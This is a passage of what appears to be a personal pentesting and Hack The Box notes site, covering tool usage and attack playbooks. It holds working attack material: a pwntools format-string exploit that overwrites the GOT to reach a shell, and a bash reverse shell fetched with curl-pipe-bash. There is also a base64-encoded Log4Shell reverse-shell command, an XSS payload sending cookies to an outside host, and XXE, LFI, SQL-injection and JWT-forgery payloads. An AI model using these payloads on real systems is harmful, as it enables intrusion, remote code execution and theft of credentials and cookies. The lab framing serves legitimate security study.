","version":"Next","tagName":"h2"},{"title":"One gadget​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#one-gadget","content":" https://github.com/david942j/one_gadget  libc library has some pieces of code that runs a piece of code similar to execve('/bin/sh', NULL, NULL) which will lead to remote code execution.  You can use the one gadget to know exactly the memory address you need to point to achive this RCE.  gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ) constraints: rsp &amp; 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL   For every memory address, it also describe which value the register need to have in order to execute the RCE.  ","version":"Next","tagName":"h2"},{"title":"Overwrite Global Object Table​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overwrite-global-object-table","content":" The global object table is used to dynamically resolve standard library functions (scanf, printf, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.  Below, you can find an example of how we can override the global object table using the one gadget tool:  from pwn import * context.binary = elf = ELF('./spooky_time') libc = context.binary.libc r = process('./spooky_time') r.sendlineafter(b'scary!\\n\\n', '%3$lx%51$lx') r.recvuntil(b'than \\n') libc.address = int(r.recvn(12), 16) - 1133111 elf.address = int(r.recvn(12), 16) - 5056 libc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool fmtstr_payload = fmtstr_payload(8, {elf.got['puts'] : libc_one_gadget}) # we make the function puts point to a RCE r.sendlineafter(b'time..\\n\\n', fmtstr_payload) r.interactive()  ","version":"Next","tagName":"h2"},{"title":"mongodb","type":0,"sectionRef":"#","url":"/docs/tooling/mongodb","content":"mongodb MongoDB is a document based (NoSQL) database that runs by default on port 27017. To connect to it, we should use the mongo shell, currently mongosh. To show all the database in the instance, use the show dbs command. To select a database: use &lt;db&gt; To show all the collections in a database use the show collections commands. To show contents of all the documents inside a collection use the db.&lt;collection&gt;.find().pretty(). It will pretty print the results. Example: mongosh &lt;ip&gt; Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b Connecting to: mongodb://&lt;ip&gt;:27017/?directConnection=true&amp;appName=mongosh+1.6.1 Using MongoDB: 3.6.8 Using Mongosh: 1.6.1 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ test&gt; show dbs admin 32.00 KiB config 72.00 KiB local 72.00 KiB sensitive_information 32.00 KiB users 32.00 KiB test&gt; show collections test&gt; use sensitive_information switched to db sensitive_information sensitive_information&gt; show collections flag sensitive_information&gt; db.flag.find().pretty() [ { _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;), flag: 'flag' } ] sensitive_information&gt; ","keywords":"","version":"Next"},{"title":"evil-winrm","type":0,"sectionRef":"#","url":"/docs/tooling/evilwinrm","content":"evil-winrm Once you know the user/password of a Windows target, you can use https://github.com/Hackplayers/evil-winrm to connect to the Powershell. Consider this tool as the PowerShell for Linux. The usage is quite easy: evil-winrm -i 10.129.67.87 -u Administrator -p &lt;password&gt; If you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash: Make sure the file /etc/ssl/openssl.cnf contains the following: [provider_sect] default = default_sect legacy = legacy_sect [default_sect] activate = 1 [legacy_sect] activate = 1 If you see the following error, it means the user is not authorized to use WinRM. It does not mean the user/password are incorrect. Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError ","keywords":"","version":"Next"},{"title":"ffuf","type":0,"sectionRef":"#","url":"/docs/tooling/ffuf","content":"","keywords":"","version":"Next"},{"title":"Fuzzing html pages​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-html-pages","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html   ","version":"Next","tagName":"h2"},{"title":"Fuzzing sub-domains​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-sub-domains","content":" ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devvortex.htb&quot; -u http://devvortex.htb -fl 8   ","version":"Next","tagName":"h2"},{"title":"Fuzzing extensions​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-extensions","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ   The wordlist has the . extension, so no need to add it to the command.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing with recursion​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-with-recursion","content":" You can fuzz directories, sub-directories and pages by using recursion:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.75:59384/FUZZ -ic -v -recursion -recursion-depth 1 -e .php   -ic ignore comments in the wordlist-v prints the whole URL-recursion enable recursive scanning-recursion-depth 1 only allow one level of recursion, otherwise the scan will take too much time-e .php set the extension to add when scanning for concrete page in directory.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing paramters​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-paramters","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:30373/admin/admin.php?FUZZ=value -fs 798   -fs 798 filter by pages returning different size of 798 bytes. This is useful to identify different page contents.  You can also fuzz POST data:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx   If you identify a parameter, you can also fuzz the values:  ffuf -w /tmp/ids.txt:FUZZ -u http://admin.academy.htb:30373/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768  ","version":"Next","tagName":"h2"},{"title":"ftp","type":0,"sectionRef":"#","url":"/docs/tooling/ftp","content":"ftp Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp) The first thing to try while trying to access ftp is user anonymous whitout password. Commands: ls: list directory contentspass: set passive modeget: retrieve file to computer Examples ftp &lt;ip&gt; Connected to &lt;ip&gt;. 220 (vsFTPd 3.0.3) Name (&lt;ip&gt;:gal): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 500 Illegal PORT command. ftp: bind: Address already in use ftp&gt; pass Passive mode on. ftp&gt; ls 227 Entering Passive Mode (10,129,103,239,82,68). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt 226 Directory send OK. ftp&gt; get flag.txt /tmp/flag.txt local: /tmp/flag.txt remote: flag.txt 227 Entering Passive Mode (10,129,103,239,159,232). 150 Opening BINARY mode data connection for flag.txt (32 bytes). 226 Transfer complete. 32 bytes received in 0.00 secs (21.1291 kB/s) in order to use the ls command, we need to set the Passive mode by issuing the pass command Download all contents of ftp-server: wget -m ftp://username:password@ip.of.old.host To see hidden files: ls -la ","keywords":"","version":"Next"},{"title":"gdb","type":0,"sectionRef":"#","url":"/docs/tooling/gdb","content":"","keywords":"","version":"Next"},{"title":"gdb-peda​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-peda","content":" Python Exploit Development Assistance for GDB   https://github.com/longld/peda  Create a pattern of 200 chars: pattern_create 200 bof.txtCalculate the number of characters to do buffer overflow: pattern_offset &lt;EIP register&gt;Get assembler code for function: disas &lt;function&gt;. The first line shows the address you must use to jump  ","version":"Next","tagName":"h2"},{"title":"gdb-gef​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-gef","content":" GDB-Enhaced Features   https://github.com/hugsy/gef  vmmap: show how the memory is organized, very useful to calculate memory offsets:  gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555557000 0x00555555558000 0x00000000002000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x007ffff7d90000 0x007ffff7d93000 0x00000000000000 rw- 0x007ffff7d93000 0x007ffff7dbb000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7dbb000 0x007ffff7f50000 0x00000000028000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7f50000 0x007ffff7fa8000 0x000000001bd000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fa8000 0x007ffff7fac000 0x00000000214000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fac000 0x007ffff7fae000 0x00000000218000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6   spooky_time memory is between address 0x00555555554000 and 0x00555555558000libc memory is between address 0x007ffff7d93000 and 0x007ffff7fae000 ","version":"Next","tagName":"h2"},{"title":"gobuster","type":0,"sectionRef":"#","url":"/docs/tooling/gobuster","content":"gobuster https://github.com/OJ/gobuster gobuster performs dir busting on a web server. It discovers available paths using a word list. The following examples checks all the words in /usr/share/dict/american-english-small dictionary and searches for paths with php extensions and stores the results in /tmp/found and uses 20 threads: gobuster -x php -u http://&lt;ip&gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20 gobuster can also perform sub-domain enumeration (by dns records or by virtual host) e.g: gobuster vhost --url http://thetoppers.htb -w /usr/share/workdlists/subdomains-top1million-5000.txt -t 50 --append-domain Consider using different wordlist for subdomains and for directories","keywords":"","version":"Next"},{"title":"netcat","type":0,"sectionRef":"#","url":"/docs/tooling/netcat","content":"netcat Listen on 1234 port: nc -lnvp 1234 -l : Listen mode -n: numeric-only IP addresses, no dns -v: verbose -p: port - we can add p to say that we want to listen on a specific port (here 1234)","keywords":"","version":"Next"},{"title":"nmap","type":0,"sectionRef":"#","url":"/docs/tooling/nmap","content":"","keywords":"","version":"Next"},{"title":"Scan all​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all","content":" You can pass the -A flag which enables OS detection, version detection, script scanning, and traceroute, however that is very easy to detect by an IDS/IPS system.  nmap -A &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Service version detection​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#service-version-detection","content":" To enable only service version detection:  nmap -sV &lt;ip&gt;   -sV flag does scanning and prints service and version on the found open port  To specify the default set of scripts for version identification use -sC  nmap -sC &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Scan all ports​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all-ports","content":" To scan all the ports, we need to specify this flags:  namp -p- &lt;ip&gt;   Take into account that this operation will take a long time to complete.  --min-rate speeds up the process by sending packets not slower than X messages per second.  ","version":"Next","tagName":"h2"},{"title":"Firewall evasion​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#firewall-evasion","content":" If nmap reports he has issues because could not determine if port open or closed. The machine might be protected by a firewall, instead of performing a TCP SYN scan, you can use a TCP FIN scan by providing the flag -sF  You can disable ping scan (blocked by firewalls) by disabling host discovery: -Pn.  ","version":"Next","tagName":"h2"},{"title":"Disable DNS resolution​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#disable-dns-resolution","content":" You can disable DNS resolution with -n ","version":"Next","tagName":"h2"},{"title":"postgres","type":0,"sectionRef":"#","url":"/docs/tooling/postgres","content":"postgres Basic commands (outisde of SQL queries): \\l list databases\\c db connect to a database named db\\dt list tables on given database","keywords":"","version":"Next"},{"title":"powershell","type":0,"sectionRef":"#","url":"/docs/tooling/powershell","content":"","keywords":"","version":"Next"},{"title":"Base64 encode​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#base64-encode","content":" [Convert]::ToBase64String((Get-Content -path &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Encoding byte))   ","version":"Next","tagName":"h2"},{"title":"Calculate MD5 hash​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#calculate-md5-hash","content":" Get-FileHash &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Algorithm MD5 | select Hash  ","version":"Next","tagName":"h2"},{"title":"rdp","type":0,"sectionRef":"#","url":"/docs/tooling/rdp","content":"rdp Stands for Remote Desktop Protocol and runs on port 3389. To connect, you can use Windows tool or if in Linux, xfreerdp or any other alternative. xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.201.55 /timeout:10000 Setting the timeout will help when connection is unstable. If checking a Windows machine, try first the Administrator user. You can mount folder over RDP: xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer To access the directory, we can connect to \\tsclient\\ in the Windows machine. Enable clipboard: +clipboard, e.g: xfreerdp /v:10.129.202.146 /u:htb-student_adm /p:Academy_student_DA! +clipboard /timeout:10000 ","keywords":"","version":"Next"},{"title":"Pentesting","type":0,"sectionRef":"#","url":"/docs/playbooks/pentesting","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#enumeration","content":" Using nmap the attacker needs to see what is open in the target machine.  At this stage, we'll behave like a legitimate user, e.g.: perform regular searches, etc...  ","version":"Next","tagName":"h2"},{"title":"Web enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#web-enumeration","content":" If nmap shows some web server, it's worth to check the following enumeration techniques.  Directory brute-foce​  This is a technique to discover all public paths of a website. There might situation where the web server is serving something but it's not referenced anywhere on the website. This is know as well as dir busting.  The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (e.g. 200 OK) answer to the page. If so, we have discovered a page in that path.  There are many tools to perform this such as gobuster and ffuf.  You can use as well the sitemap functionality in the burp suite.  Sub-domain brute force​  This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server.  Usually this works by providing values in the HTTP Host header.  There are many tools to perform this such as gobuster and ffuf.  Robots.txt​  It's always interesting to check the contents of robots.txt, for instance here, the file reveals the server hosts a joomla CMS:  # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # https://www.robotstxt.org/orig.html User-agent: * Disallow: /administrator/ Disallow: /api/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/   It also gives an idea of possible paths into the application  Whatweb​  https://github.com/urbanadventurer/WhatWeb  This program will output a list of technologies used in the website by reading the HTTP response headers, etc...  └─$ whatweb https://github.com/urbanadventurer/WhatWeb https://github.com/urbanadventurer/WhatWeb [200 OK] Cookies[_gh_sess,_octo,logged_in], Country[UNITED STATES][US], Email[banner@2x.png,nk@dsigned.gr,snoo-home@2x.png], HTML5, HTTPServer[GitHub.com], HttpOnly[_gh_sess,logged_in], IP[140.82.121.3], Open-Graph-Protocol[object][1401488693436528], OpenSearch[/opensearch.xml], PoweredBy[WordPress,[PHP/5,[phpBB],,abc,abc\\,abc\\&amp;quot;,phpBB,phpBB&amp;quot;], Script[application/javascript,application/json], Strict-Transport-Security[max-age=31536000; includeSubdomains; preload], Title[GitHub - urbanadventurer/WhatWeb: Next generation web scanner], UncommonHeaders[x-content-type-options,referrer-policy,content-security-policy,x-github-request-id], probably WordPress, X-Frame-Options[deny], X-XSS-Protection[0]   ","version":"Next","tagName":"h3"},{"title":"SMB enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#smb-enumeration","content":" If nmap show the Sambda related ports, see: https://www.cyberciti.biz/faq/what-ports-need-to-be-open-for-samba-to-communicate-with-other-windowslinux-systems/  You can try to enumerate the Sambda shared and check if they can be accessed anonimously.  smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available   Check smbclient for reference  ","version":"Next","tagName":"h3"},{"title":"Breaking in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#breaking-in","content":" This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine, no matter if the user is privileged or not.  At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to discover vulnerabilities.  The attack vector is different to each machine, here you can find most common vector attacks  ","version":"Next","tagName":"h2"},{"title":"Anonymous access​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#anonymous-access","content":" The user might have ftp or tftp or smb shares with anonymous access. It's worth taking a look because those access might leak some valuable information. Additionally, you can also check metasploit to check for this kind of access.  ","version":"Next","tagName":"h3"},{"title":"Guess/Brute force credentials​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#guessbrute-force-credentials","content":" If you discover a login page, why not trying some default user/password combinations? Try the following user/password combinations first:  admin:adminadministrator:administratoradmin:administratoradmin:passwordadministrator:password...  If you are login to a third-party applications it's wise to do a google search for default credentials.  You can try a dictionary attack to bruce force user/password combinations.  You can use a tool like thc-hydra. However, this will fail if there if there's any kind of CSRF protection.  ","version":"Next","tagName":"h3"},{"title":"SQL Injection​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#sql-injection","content":" Poorly programmed queries can be very dangerous and leads to escaping issues in the queries.  If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.  A typical SQL query for a login page can look like this:  SELECT * FROM members WHERE username = 'admin' AND password = 'admin'   If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:  SELECT * FROM members WHERE username = 'admin' #' AND password = 'kjdfjklsdf'   Now the query becomes:  SELECT * FROM members WHERE username = 'admin'   therefore, the query is no longer checking for password and the login page is bypassed.  Pay attention when breaking the rest of the query with comments. The standard comment -- might not always work, it's worth trying another kind of comments like #. Also, you might want to URL encode the escaping characters.  SQL injections reference: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet  ","version":"Next","tagName":"h3"},{"title":"Server side template injection (SSTI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#server-side-template-injection-ssti","content":" if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.  If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.  One easy way to test that is to put something like {{7*7}} in the template and check for the result.  If the template executes, we'll see the result, out of luck we will see nothing. Or maybe we'll see some trace that reveals the technology behind.  ","version":"Next","tagName":"h3"},{"title":"Arbitrary file upload​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#arbitrary-file-upload","content":" This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands as if it was inside the machine.  ","version":"Next","tagName":"h3"},{"title":"File inclusion (LFI,RFI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#file-inclusion-lfirfi","content":" Some pages include other pages in order to improve re-usability, e.g. header and footer. If this is not configured properly, an attacker can use the include functionality to read local files.  http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts   You can try to read the following files for Linux:  /etc/hosts/etc/passwd  and for Windows:  C:/Windows/System32/drivers/etc/hostsc:/windows/win.ini  Depending on the inclusion it might lead to Remote File Inclusion, which is execute remote files.  This can be used for example to force the target make a call to a compromised host in the same network and capture the credentials challenge:  http://unika.htb/index.php?page=\\\\10.1.2.3\\blabla\\   ","version":"Next","tagName":"h3"},{"title":"Reverse shell ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#reverse-shell-","content":" Reverse basically means that it is the target that will initiate a connection request back us (the attacker).  For example, once we have remote code execution in the target, we'll be able to download and execute a piece of code.  Usually the process is:  Create a file in the attacker machine containing a reverse shell payload:  #!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1   Create a server in the attacker machine which will act as the shell I/O. Normally this is done with netcat.  nc -nvlp 1337   Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):  python3 -m http.server 8000   Make the target machine download and execute the reverse shell payload:  http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash   You can find a list of reverse shells here: https://www.revshells.com/  Once you have shell access, most likely it will not be interactive and you'll miss many functionalities. You can try to get a improve the shell if python is installed:  python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' CTRL+Z stty raw -echo fg export TERM=xterm   Or, you can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  ","version":"Next","tagName":"h3"},{"title":"Rogue servers ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#rogue-servers-","content":" The idea of rogue server is to start a server in the attacker machine and make the target machine speak with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.  NTLM ​  Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.  In order to mess with it, you might use the responder tool.  The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by responder tool). This tool will capture the authentication challenge hash and then you can use john tool to compare the hash with a dictionary to see if any entry matches.  Log4jShell ​  It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from https://github.com/veracode-research/rogue-jndi in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.  E.g.:  java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;   Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.  Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:  ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}   ","version":"Next","tagName":"h3"},{"title":"XML eXternal Entities (XXE)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#xml-external-entities-xxe","content":" If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.  This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.  In order to check if the machine is vulnerable to this attack, you can try to show the contents of /etc/hosts(Linux) or C:/Windows/System32/drivers/etc/hosts(Windows). e.g.:  &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;]&gt; &lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;Fake street 1234&lt;/address&gt;&lt;/order&gt;   ","version":"Next","tagName":"h3"},{"title":"JWT Key confussion attack​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#jwt-key-confussion-attack","content":" JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...  They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.  ","version":"Next","tagName":"h3"},{"title":"Cross-Site Scripting (XSS) ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cross-site-scripting-xss-","content":" This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.  Let's imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.  E.g.  Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):  fetch(&quot;https://ojm5l9c8.requestrepo.com/?&quot; + document.cookie);   Write the XSS HTML code in the input form field:  &lt;script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&gt;&lt;/script&gt;   In the remote url (requestrepo), you'll see the value of the document.cookie  There's a security header in modern browsers to prevent this Content Security Policy (CSP). However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.  ","version":"Next","tagName":"h3"},{"title":"Cookie hijacking​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cookie-hijacking","content":" If you see the application has some cookies and you somehow got access to a privileged cookie, you just need to change it in your browser and you'll access as the privileged user.  ","version":"Next","tagName":"h3"},{"title":"Foothold, we are in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#foothold-we-are-in","content":" At this point we have shell (or reverse) access to the target machine. Now we are in the machine, but we don't have much access, probably we're logged in as a user that can't do much and have access to few places.  ","version":"Next","tagName":"h2"},{"title":"List users and groups​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#list-users-and-groups","content":" We might discover other users of the machine.  In Linux, you can query all the available users in the target by querying /etc/passwd.  To retrieve the details about the current shell user, you can do id command. It will list the groups that the user belong. This might be useful for privilege escalation.  You can also list the binaries the user or group has access:  find / -group bugtracker 2&gt;/dev/null   ","version":"Next","tagName":"h3"},{"title":"Search for interesting keywords​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#search-for-interesting-keywords","content":" You can search inside the contents of files for interesting contents (passwords):  Let's image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:  grep -Ril 'passwd*' /var/www/html   -R recursive-i ignore case-l show the file, not the match  ","version":"Next","tagName":"h3"},{"title":"Local port forwarding​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#local-port-forwarding","content":" Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.  With the next command, we'll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port  ssh -L 5432:localhost:5432 christine@funnel.htb   and now you can access funnel.htb:5432 in localhost:5432  ","version":"Next","tagName":"h3"},{"title":"Lateral movement​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#lateral-movement","content":" Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc... to switch from a low-permission user to a user with more permissions. That's called lateral movement and it's a step forward privilege escalation.  Also part of lateral movement is to use the machine as a pivot to enumerate more network devices. Typically this is done for enterprise level pentesting. Once a machine is compromised, you can access the machines in the same network even if they don't have public access.  Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the .ssh folder in the user home:  /home/michael/.ssh/id_rsac/users/daniel/.ssh/id_rsa  Paste the contents of that private key into the attacker machine and run:  chmod 400 michael-id-rsa ssh -i michael-id-rsa michael@target.htb   An interesting option for lateral movement is checking the values set in the environment variables:  5d711b9d670a:/metabase.db$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5d711b9d670a 